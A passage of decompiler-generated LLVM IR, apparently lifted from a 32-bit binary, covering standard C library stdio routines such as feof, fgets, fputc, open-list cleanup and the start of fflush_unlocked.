  %v1_805c796 = add i32 %v3_805c793, 2
  store i32 %v1_805c796, i32* %eax.global-to-local, align 4
  %v5_805c79b = icmp slt i32 %v1_805c792, %v1_805c796
  br i1 %v5_805c79b, label %dec_label_pc_805c71b, label %dec_label_pc_805c7c9

dec_label_pc_805c7a2:                             ; preds = %dec_label_pc_805c70e
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805c7a6 = add i32 %tmp76, 38
  %v2_805c7a6 = inttoptr i32 %v1_805c7a6 to i8*
  store i8 1, i8* %v2_805c7a6, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805c7af = add i32 %tmp76, 28
  %v2_805c7af = inttoptr i32 %v1_805c7af to i32*
  %v3_805c7af = load i32, i32* %v2_805c7af, align 4
  %v2_805c7b2 = mul i32 %v3_805c7af, 4
  %v2_805c7b6 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805c7bd = add i32 %tmp76, 40
  store i32 %v1_805c7bd, i32* %eax.global-to-local, align 4
  %v3_805c7c1 = inttoptr i32 %v1_805c7bd to i16*
  %v4_805c7c1 = call i32 @memcpy(i16* %v3_805c7c1, i32 %v2_805c7b6, i32 %v2_805c7b2)
  store i32 %v4_805c7c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c7c9

dec_label_pc_805c7c9:                             ; preds = %dec_label_pc_805c78e, %dec_label_pc_805c7a2
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805c7a2 ], [ %stack_var_-88.5, %dec_label_pc_805c78e ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_805c474, align 4
  %v0_805c7d4 = load i32, i32* @ecx, align 4
  %v1_805c7d4 = add i32 %v0_805c7d4, 16
  %v2_805c7d4 = inttoptr i32 %v1_805c7d4 to i8*
  %v3_805c7d4 = load i8, i8* %v2_805c7d4, align 1
  %v5_805c7d4 = icmp slt i8 %v3_805c7d4, 0
  br i1 %v5_805c7d4, label %dec_label_pc_805c7e1, label %dec_label_pc_805c7da

dec_label_pc_805c7da:                             ; preds = %dec_label_pc_805c7c9
  %v0_805c7da = load i32, i32* @esi, align 4
  %v1_805c7da = add i32 %v0_805c7da, 1
  store i32 %v1_805c7da, i32* %eax.global-to-local, align 4
  %v2_805c7dd = inttoptr i32 %v0_805c7d4 to i32*
  store i32 %v1_805c7da, i32* %v2_805c7dd, align 4
  br label %dec_label_pc_805c7f4

dec_label_pc_805c7e1:                             ; preds = %dec_label_pc_805c7c9
  store i32 %v4_805c448, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805c7e9 = load i32, i32* @esi, align 4
  %v2_805c7e9 = sub i32 %v0_805c7e9, %v4_805c448
  store i32 %v2_805c7e9, i32* %esi.global-to-local, align 4
  %v1_805c7eb = mul i32 %v2_805c7e9, 4
  %v2_805c7eb = add i32 %v1_805c7eb, 224
  store i32 %v2_805c7eb, i32* %eax.global-to-local, align 4
  %v2_805c7f2 = load i32, i32* %arg1, align 4
  %v4_805c7f2 = add i32 %v2_805c7f2, %v2_805c7eb
  store i32 %v4_805c7f2, i32* %arg1, align 4
  br label %dec_label_pc_805c7f4

dec_label_pc_805c7f4:                             ; preds = %dec_label_pc_805c7da, %dec_label_pc_805c7e1
  store i32 %tmp76, i32* @edx, align 4
  %v1_805c7f8 = add i32 %tmp76, 28
  %v2_805c7f8 = inttoptr i32 %v1_805c7f8 to i32*
  %v3_805c7f8 = load i32, i32* %v2_805c7f8, align 4
  store i32 %v3_805c7f8, i32* %eax.global-to-local, align 4
  %v1_805c7fb = add i32 %v3_805c7f8, 2
  br label %dec_label_pc_805c803

dec_label_pc_805c800:                             ; preds = %dec_label_pc_805c499, %dec_label_pc_805c533, %dec_label_pc_805c566, %dec_label_pc_805c5e1, %dec_label_pc_805c5cd, %dec_label_pc_805c5c4, %dec_label_pc_805c740, %dec_label_pc_805c6f7, %dec_label_pc_805c643
  br label %dec_label_pc_805c803

dec_label_pc_805c803:                             ; preds = %dec_label_pc_805c7f4, %dec_label_pc_805c800
  %storemerge6 = phi i32 [ -1, %dec_label_pc_805c800 ], [ %v1_805c7fb, %dec_label_pc_805c7f4 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_805c806 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805c806, i32* @ebx, align 4
  store i32 %v0_805c447, i32* @esi, align 4
  store i32 %v0_805c446, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_805c792, { 0, 2, 1 }
  uselistorder i32 %v1_805c74d, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805c740, { 1, 0 }
  uselistorder i32 %v5_805c73a, { 1, 2, 0 }
  uselistorder i32 %v0_805c74d, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_805c71b, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_805c731, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_805c6ac, { 1, 2, 0 }
  uselistorder i32 %v1_805c682, { 1, 2, 0 }
  uselistorder i32 %v0_805c6ac, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805c647, { 1, 0 }
  uselistorder i32 %v1_805c636, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805c63f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_805c629, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805c61f, { 1, 0 }
  uselistorder i32 %v1_805c601, { 1, 0 }
  uselistorder i32 %v0_805c61f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_805c5e4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805c5db, { 1, 2, 0 }
  uselistorder i32 %v0_805c5a1, { 1, 0 }
  uselistorder i32 %v1_805c593, { 1, 0 }
  uselistorder i32 %v1_805c58e, { 0, 1, 3, 2 }
  uselistorder i32 %v6_805c58c, { 2, 0, 1 }
  uselistorder i32 %v0_805c5ae, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_805c549, { 1, 2, 0 }
  uselistorder i32 %v0_805c521, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_805c517, { 1, 2, 0 }
  uselistorder i32 %v6_805c515, { 0, 2, 1 }
  uselistorder i32 %v0_805c514, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_805c50d, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_805c50d, { 2, 1, 0 }
  uselistorder i32 %v1_805c505, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_805c4f0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_805c4eb, { 1, 0, 3, 2 }
  uselistorder i32 %v1_805c4c1, { 0, 2, 1 }
  uselistorder i32 %v0_805c4ae, { 2, 0, 1 }
  uselistorder i32 %v4_805c448, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 34, 30, 29, 31, 32, 35, 33, 41, 36, 37, 38, 39, 40, 42, 43 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 2, 3, 4, 1, 5, 0, 6, 7, 8 }
  uselistorder i32 3840, { 4, 5, 6, 2, 3, 0, 1 }
  uselistorder i32 -5, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 -134663007, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_806cb69.708 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805c803, { 1, 0 }
  uselistorder label %dec_label_pc_805c800, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_805c7f4, { 1, 0 }
  uselistorder label %dec_label_pc_805c7c9, { 1, 0 }
  uselistorder label %dec_label_pc_805c78e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c73a, { 1, 0 }
  uselistorder label %dec_label_pc_805c70e, { 1, 0 }
  uselistorder label %dec_label_pc_805c676, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805c643, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c61a, { 1, 0 }
  uselistorder label %dec_label_pc_805c5f1, { 1, 0 }
  uselistorder label %dec_label_pc_805c5b8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805c55b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c515, { 1, 0 }
  uselistorder label %dec_label_pc_805c514, { 1, 0 }
  uselistorder label %dec_label_pc_805c4fb, { 1, 0 }
  uselistorder label %dec_label_pc_805c4e4, { 1, 0 }
  uselistorder label %dec_label_pc_805c4e4.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_805c80c = load i32, i32* @edi, align 4
  %v0_805c80d = load i32, i32* @esi, align 4
  %v0_805c80e = load i32, i32* @ebx, align 4
  store i32 %tmp5, i32* @esi, align 4
  %v1_805c816 = add i32 %tmp5, 52
  %v2_805c816 = inttoptr i32 %v1_805c816 to i32*
  %v3_805c816 = load i32, i32* %v2_805c816, align 4
  store i32 %v3_805c816, i32* @edi, align 4
  %v1_805c819 = icmp eq i32 %v3_805c816, 0
  %v1_805c81b = icmp eq i1 %v1_805c819, false
  br i1 %v1_805c81b, label %dec_label_pc_805c83c.thread, label %dec_label_pc_805c842

dec_label_pc_805c83c.thread:                      ; preds = %entry
  br label %dec_label_pc_805c853

dec_label_pc_805c842:                             ; preds = %entry
  %v1_805c81d = add i32 %tmp5, 56
  store i32 %v1_805c81d, i32* @ebx, align 4
  %v4_805c82c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134585853, i32 %v1_805c81d)
  %v0_805c831 = load i32, i32* @ebx, align 4
  %v1_805c834 = call i32 @pthread_mutex_lock(i32 %v0_805c831)
  %v0_805c83c.pre = load i32, i32* @esi, align 4
  %v1_805c83c = inttoptr i32 %v0_805c83c.pre to i32*
  %v2_805c83c = load i32, i32* %v1_805c83c, align 4
  store i32 %v2_805c83c, i32* @ebx, align 4
  %v3_805c84b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_805c853

dec_label_pc_805c853:                             ; preds = %dec_label_pc_805c83c.thread, %dec_label_pc_805c842
  %v0_805c853.in = phi i32* [ @ebx, %dec_label_pc_805c842 ], [ %arg1, %dec_label_pc_805c83c.thread ]
  %v0_805c853 = load i32, i32* %v0_805c853.in, align 4
  %v1_805c858 = and i32 %v0_805c853, 4
  store i32 %v0_805c80e, i32* @ebx, align 4
  store i32 %v0_805c80d, i32* @esi, align 4
  store i32 %v0_805c80c, i32* @edi, align 4
  ret i32 %v1_805c858

; uselistorder directives
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805c853, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805c860 = load i32, i32* @edi, align 4
  %v0_805c861 = load i32, i32* @esi, align 4
  %v0_805c862 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805c86a = add i32 %arg3, 52
  %v2_805c86a = inttoptr i32 %v1_805c86a to i32*
  %v3_805c86a = load i32, i32* %v2_805c86a, align 4
  store i32 %v3_805c86a, i32* @edi, align 4
  %v1_805c86d = icmp eq i32 %v3_805c86a, 0
  %v1_805c86f = icmp eq i1 %v1_805c86d, false
  br i1 %v1_805c86f, label %entry.dec_label_pc_805c890_crit_edge, label %dec_label_pc_805c871

entry.dec_label_pc_805c890_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805c890

dec_label_pc_805c871:                             ; preds = %entry
  %v1_805c871 = add i32 %arg3, 56
  store i32 %v1_805c871, i32* @ebx, align 4
  %v4_805c880 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134585853, i32 %v1_805c871)
  %v0_805c885 = load i32, i32* @ebx, align 4
  %v1_805c888 = call i32 @pthread_mutex_lock(i32 %v0_805c885)
  %v0_805c891.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c890

dec_label_pc_805c890:                             ; preds = %entry.dec_label_pc_805c890_crit_edge, %dec_label_pc_805c871
  %v0_805c891 = phi i32 [ %arg3, %entry.dec_label_pc_805c890_crit_edge ], [ %v0_805c891.pre, %dec_label_pc_805c871 ]
  %v0_805c890 = load i32, i32* @edx, align 4
  %v4_805c89a = inttoptr i32 %arg1 to i8*
  %v5_805c89a = call i32 @__GI_fgets_unlocked(i8* %v4_805c89a, i32 %arg2, i32 %v0_805c891, i32 %v0_805c890)
  store i32 %v5_805c89a, i32* @ebx, align 4
  br i1 %v1_805c86f, label %dec_label_pc_805c8b9, label %dec_label_pc_805c8a8

dec_label_pc_805c8a8:                             ; preds = %dec_label_pc_805c890
  %v3_805c8b1 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805c8bc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c8b9

dec_label_pc_805c8b9:                             ; preds = %dec_label_pc_805c890, %dec_label_pc_805c8a8
  %v0_805c8bc = phi i32 [ %v5_805c89a, %dec_label_pc_805c890 ], [ %v0_805c8bc.pre, %dec_label_pc_805c8a8 ]
  store i32 %v0_805c862, i32* @ebx, align 4
  store i32 %v0_805c861, i32* @esi, align 4
  store i32 %v0_805c860, i32* @edi, align 4
  ret i32 %v0_805c8bc

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805c8b9, { 1, 0 }
  uselistorder label %dec_label_pc_805c890, { 1, 0 }
}

define i32 @__GI_fputc(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805c8c4 = load i32, i32* @edi, align 4
  %v0_805c8c5 = load i32, i32* @esi, align 4
  %v0_805c8c6 = load i32, i32* @ebx, align 4
  %v12_805c8c7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_805c8ce = sext i8 %arg1 to i32
  store i32 %v4_805c8ce, i32* @edi, align 4
  %v1_805c8d2 = add i32 %arg2, 52
  %v2_805c8d2 = inttoptr i32 %v1_805c8d2 to i32*
  %v3_805c8d2 = load i32, i32* %v2_805c8d2, align 4
  %v4_805c8d2 = icmp eq i32 %v3_805c8d2, 0
  br i1 %v4_805c8d2, label %dec_label_pc_805c8fa, label %dec_label_pc_805c8d8

dec_label_pc_805c8d8:                             ; preds = %entry
  %v1_805c8d8 = add i32 %arg2, 16
  %v2_805c8d8 = inttoptr i32 %v1_805c8d8 to i32*
  %v3_805c8d8 = load i32, i32* %v2_805c8d8, align 4
  store i32 %v3_805c8d8, i32* %eax.global-to-local, align 4
  %v2_805c8db = add i32 %arg2, 28
  %v3_805c8db = inttoptr i32 %v2_805c8db to i32*
  %v4_805c8db = load i32, i32* %v3_805c8db, align 4
  %v10_805c8db = icmp ult i32 %v3_805c8d8, %v4_805c8db
  %v1_805c8de = icmp eq i1 %v10_805c8db, false
  br i1 %v1_805c8de, label %dec_label_pc_805c8ed, label %dec_label_pc_805c8e0

dec_label_pc_805c8e0:                             ; preds = %dec_label_pc_805c8d8
  store i32 %v4_805c8ce, i32* @edx, align 4
  %v3_805c8e2 = inttoptr i32 %v3_805c8d8 to i8*
  store i8 %arg1, i8* %v3_805c8e2, align 1
  %v0_805c8e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c8e4 = add i32 %v0_805c8e4, 1
  store i32 %v1_805c8e4, i32* %eax.global-to-local, align 4
  %v0_805c8e5 = load i32, i32* @edx, align 4
  %v1_805c8e5 = urem i32 %v0_805c8e5, 256
  store i32 %v1_805c8e5, i32* @ebx, align 4
  %v1_805c8e8 = load i32, i32* @esi, align 4
  %v2_805c8e8 = add i32 %v1_805c8e8, 16
  %v3_805c8e8 = inttoptr i32 %v2_805c8e8 to i32*
  store i32 %v1_805c8e4, i32* %v3_805c8e8, align 4
  br label %dec_label_pc_805c94d

dec_label_pc_805c8ed:                             ; preds = %dec_label_pc_805c8d8
  %v4_805c8f1 = call i32 @putc_unlocked(i8 %arg1, i32 %arg2)
  store i32 %v4_805c8f1, i32* %eax.global-to-local, align 4
  store i32 %v4_805c8f1, i32* @ebx, align 4
  br label %dec_label_pc_805c94a

dec_label_pc_805c8fa:                             ; preds = %entry
  %v1_805c8fa = add i32 %arg2, 56
  store i32 %v1_805c8fa, i32* @ebx, align 4
  store i32 %v12_805c8c7, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v12_805c8c7, 16777216
  %v1_805c909 = sdiv i32 %sext, 16777216
  %v4_805c909 = inttoptr i32 %v1_805c909 to i32*
  %v5_805c909 = call i32 @__pthread_cleanup_push_defer(i32* %v4_805c909, i32 134585853, i32 %v1_805c8fa)
  store i32 %v5_805c909, i32* %eax.global-to-local, align 4
  %v0_805c90e = load i32, i32* @ebx, align 4
  %sext1 = mul i32 %v0_805c90e, 16777216
  %v1_805c911 = sdiv i32 %sext1, 16777216
  %v2_805c911 = call i32 @pthread_mutex_lock(i32 %v1_805c911)
  store i32 %v2_805c911, i32* %eax.global-to-local, align 4
  %v0_805c916 = load i32, i32* @esi, align 4
  %v1_805c916 = add i32 %v0_805c916, 16
  %v2_805c916 = inttoptr i32 %v1_805c916 to i32*
  %v3_805c916 = load i32, i32* %v2_805c916, align 4
  store i32 %v3_805c916, i32* %eax.global-to-local, align 4
  %v2_805c91c = add i32 %v0_805c916, 28
  %v3_805c91c = inttoptr i32 %v2_805c91c to i32*
  %v4_805c91c = load i32, i32* %v3_805c91c, align 4
  %v10_805c91c = icmp ult i32 %v3_805c916, %v4_805c91c
  %v1_805c91f = icmp eq i1 %v10_805c91c, false
  %v0_805c931 = load i32, i32* @edi, align 4
  br i1 %v1_805c91f, label %dec_label_pc_805c92e, label %dec_label_pc_805c921

dec_label_pc_805c921:                             ; preds = %dec_label_pc_805c8fa
  store i32 %v0_805c931, i32* %edx.global-to-local, align 4
  %v1_805c923 = trunc i32 %v0_805c931 to i8
  %v3_805c923 = inttoptr i32 %v3_805c916 to i8*
  store i8 %v1_805c923, i8* %v3_805c923, align 1
  %v0_805c925 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c925 = add i32 %v0_805c925, 1
  store i32 %v1_805c925, i32* %eax.global-to-local, align 4
  %v0_805c926 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c926 = urem i32 %v0_805c926, 256
  store i32 %v1_805c926, i32* @ebx, align 4
  %v1_805c929 = load i32, i32* @esi, align 4
  %v2_805c929 = add i32 %v1_805c929, 16
  %v3_805c929 = inttoptr i32 %v2_805c929 to i32*
  store i32 %v1_805c925, i32* %v3_805c929, align 4
  br label %dec_label_pc_805c93c

dec_label_pc_805c92e:                             ; preds = %dec_label_pc_805c8fa
  %v5_805c931 = trunc i32 %v0_805c931 to i8
  %v4_805c932 = call i32 @putc_unlocked(i8 %v5_805c931, i32 %v0_805c916)
  store i32 %v4_805c932, i32* %eax.global-to-local, align 4
  store i32 %v4_805c932, i32* @ebx, align 4
  br label %dec_label_pc_805c93c

dec_label_pc_805c93c:                             ; preds = %dec_label_pc_805c921, %dec_label_pc_805c92e
  store i32 %v12_805c8c7, i32* %eax.global-to-local, align 4
  %v4_805c945 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_805c909, i32 1)
  store i32 %v4_805c945, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c94a

dec_label_pc_805c94a:                             ; preds = %dec_label_pc_805c8ed, %dec_label_pc_805c93c
  br label %dec_label_pc_805c94d

dec_label_pc_805c94d:                             ; preds = %dec_label_pc_805c8e0, %dec_label_pc_805c94a
  %v0_805c950 = load i32, i32* @ebx, align 4
  store i32 %v0_805c950, i32* %eax.global-to-local, align 4
  store i32 %v0_805c8c6, i32* @ebx, align 4
  store i32 %v0_805c8c5, i32* @esi, align 4
  store i32 %v0_805c8c4, i32* @edi, align 4
  ret i32 %v0_805c950

; uselistorder directives
  uselistorder i32 %v0_805c931, { 2, 1, 0 }
  uselistorder i32 %v12_805c8c7, { 1, 0, 2 }
  uselistorder i32 (i8, i32)* @putc_unlocked, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_805c94d, { 1, 0 }
  uselistorder label %dec_label_pc_805c94a, { 1, 0 }
  uselistorder label %dec_label_pc_805c93c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v6_805c96c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134585853, i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  %v2_805c978 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  %v0_805c97d = load i32, i32* @global_var_807aefc.687, align 4
  %v8_805c985 = icmp eq i32 %v0_805c97d, 1
  %v1_805c986 = icmp eq i1 %v8_805c985, false
  br i1 %v1_805c986, label %dec_label_pc_805ca1d, label %dec_label_pc_805c98c

dec_label_pc_805c98c:                             ; preds = %entry
  %v0_805c98c = load i32, i32* @global_var_807af00.688, align 256
  %tmp30 = icmp slt i32 %v0_805c98c, 1
  br i1 %tmp30, label %dec_label_pc_805ca1d, label %dec_label_pc_805c999

dec_label_pc_805c999:                             ; preds = %dec_label_pc_805c98c
  store i32 0, i32* @esi, align 4
  %v6_805c9ab = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 134585853, i32 ptrtoint (i32* @global_var_8074620.697 to i32))
  %v2_805c9b7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074620.697 to i32))
  %v0_805c9bc = load i32, i32* bitcast (i32** @global_var_807461c.665 to i32*), align 4
  store i32 %v0_805c9bc, i32* %edx.global-to-local, align 4
  %v1_805c9fe5 = icmp eq i32 %v0_805c9bc, 0
  %v1_805ca0012 = icmp eq i1 %v1_805c9fe5, false
  br i1 %v1_805ca0012, label %dec_label_pc_805c9c7, label %dec_label_pc_805ca02

dec_label_pc_805c9c7:                             ; preds = %dec_label_pc_805c999, %dec_label_pc_805c9fc
  %v0_805c9d7 = phi i32 [ %v0_805c9fc, %dec_label_pc_805c9fc ], [ %v0_805c9bc, %dec_label_pc_805c999 ]
  %v1_805c9c715 = inttoptr i32 %v0_805c9d7 to i16*
  %v2_805c9c7 = load i16, i16* %v1_805c9c715, align 2
  %v1_805c9cf = add i32 %v0_805c9d7, 32
  %v2_805c9cf = inttoptr i32 %v1_805c9cf to i32*
  %v3_805c9cf = load i32, i32* %v2_805c9cf, align 4
  store i32 %v3_805c9cf, i32* @ebx, align 4
  %v1_805c9ca = and i16 %v2_805c9c7, -32720
  %v6_805c9d2 = icmp eq i16 %v1_805c9ca, 48
  br i1 %v6_805c9d2, label %dec_label_pc_805c9db, label %dec_label_pc_805c9d7

dec_label_pc_805c9d7:                             ; preds = %dec_label_pc_805c9c7
  store i32 %v0_805c9d7, i32* @esi, align 4
  br label %dec_label_pc_805c9fc

dec_label_pc_805c9db:                             ; preds = %dec_label_pc_805c9c7
  %v0_805c9db = load i32, i32* @esi, align 4
  %v1_805c9db = icmp eq i32 %v0_805c9db, 0
  %v1_805c9dd = icmp eq i1 %v1_805c9db, false
  br i1 %v1_805c9dd, label %dec_label_pc_805c9e7, label %dec_label_pc_805c9df

dec_label_pc_805c9df:                             ; preds = %dec_label_pc_805c9db
  store i32 %v3_805c9cf, i32* bitcast (i32** @global_var_807461c.665 to i32*), align 4
  br label %dec_label_pc_805c9ea

dec_label_pc_805c9e7:                             ; preds = %dec_label_pc_805c9db
  %v2_805c9e7 = add i32 %v0_805c9db, 32
  %v3_805c9e7 = inttoptr i32 %v2_805c9e7 to i32*
  store i32 %v3_805c9cf, i32* %v3_805c9e7, align 4
  %v0_805c9ea.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c9ea

dec_label_pc_805c9ea:                             ; preds = %dec_label_pc_805c9df, %dec_label_pc_805c9e7
  %v0_805c9f3 = phi i32 [ %v0_805c9d7, %dec_label_pc_805c9df ], [ %v0_805c9ea.pre, %dec_label_pc_805c9e7 ]
  %v1_805c9ea = add i32 %v0_805c9f3, 1
  %v2_805c9ea = inttoptr i32 %v1_805c9ea to i8*
  %v3_805c9ea = load i8, i8* %v2_805c9ea, align 1
  %v4_805c9ea = and i8 %v3_805c9ea, 32
  %v5_805c9ea = icmp eq i8 %v4_805c9ea, 0
  br i1 %v5_805c9ea, label %dec_label_pc_805c9fc, label %dec_label_pc_805c9f0

dec_label_pc_805c9f0:                             ; preds = %dec_label_pc_805c9ea
  %v2_805c9f4 = call i32 @free(i32 %v0_805c9f3)
  br label %dec_label_pc_805c9fc

dec_label_pc_805c9fc:                             ; preds = %dec_label_pc_805c9ea, %dec_label_pc_805c9d7, %dec_label_pc_805c9f0
  %v0_805c9fc = load i32, i32* @ebx, align 4
  store i32 %v0_805c9fc, i32* %edx.global-to-local, align 4
  %v1_805c9fe = icmp eq i32 %v0_805c9fc, 0
  %v1_805ca00 = icmp eq i1 %v1_805c9fe, false
  br i1 %v1_805ca00, label %dec_label_pc_805c9c7, label %dec_label_pc_805ca02

dec_label_pc_805ca02:                             ; preds = %dec_label_pc_805c9fc, %dec_label_pc_805c999
  %v4_805ca0b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 0, i32* @global_var_807af00.688, align 256
  %v0_805ca1d.pre = load i32, i32* @global_var_807aefc.687, align 4
  br label %dec_label_pc_805ca1d

dec_label_pc_805ca1d:                             ; preds = %dec_label_pc_805c98c, %entry, %dec_label_pc_805ca02
  %v0_805ca1d = phi i32 [ %v0_805c97d, %dec_label_pc_805c98c ], [ %v0_805c97d, %entry ], [ %v0_805ca1d.pre, %dec_label_pc_805ca02 ]
  %v1_805ca22 = add i32 %v0_805ca1d, -1
  store i32 %v1_805ca22, i32* @global_var_807aefc.687, align 4
  %v4_805ca31 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 %v4_805ca31

; uselistorder directives
  uselistorder i32 %v0_805c9fc, { 1, 2, 0 }
  uselistorder i32 %v0_805c9d7, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805c97d, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder i32* bitcast (i32** @global_var_807461c.665 to i32*), { 3, 4, 0, 1, 5, 6, 2, 7 }
  uselistorder label %dec_label_pc_805ca1d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c9fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c9ea, { 1, 0 }
  uselistorder label %dec_label_pc_805c9c7, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_805ca3c = load i32, i32* @ebp, align 4
  %v0_805ca3d = load i32, i32* @edi, align 4
  %v0_805ca3e = load i32, i32* @esi, align 4
  %v0_805ca3f = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_805ca45 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805ca45, i32* @ebx, align 4
  %v10_805ca49 = icmp eq i16* %arg1, inttoptr (i32 134694428 to i16*)
  br i1 %v10_805ca49, label %dec_label_pc_805ca5e, label %dec_label_pc_805ca51

dec_label_pc_805ca51:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_805ca56 = icmp eq i16* %arg1, null
  %v1_805ca58 = icmp eq i1 %v2_805ca56, false
  br i1 %v1_805ca58, label %dec_label_pc_805cb4d, label %dec_label_pc_805ca5e

dec_label_pc_805ca5e:                             ; preds = %dec_label_pc_805ca51, %entry
  store i32 0, i32* @edi, align 4
  %v2_805ca6b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805ca6b, i32* @ebx, align 4
